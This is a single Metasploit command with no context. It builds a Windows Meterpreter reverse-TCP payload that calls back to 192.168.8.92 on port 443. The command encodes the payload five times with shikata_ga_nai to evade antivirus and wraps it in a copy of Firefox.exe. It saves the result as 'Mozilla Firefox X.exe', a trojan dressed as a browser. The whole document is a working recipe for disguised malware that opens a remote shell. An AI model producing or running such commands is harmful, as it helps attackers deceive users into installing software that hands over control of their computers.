msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.8.92 LPORT=443 R | msfencode -e x86/shikata_ga_nai -c 5 -t exe -x /root/Desktop/Firefox.exe -o /root/Desktop/Mozilla\ Firefox\ X.exe
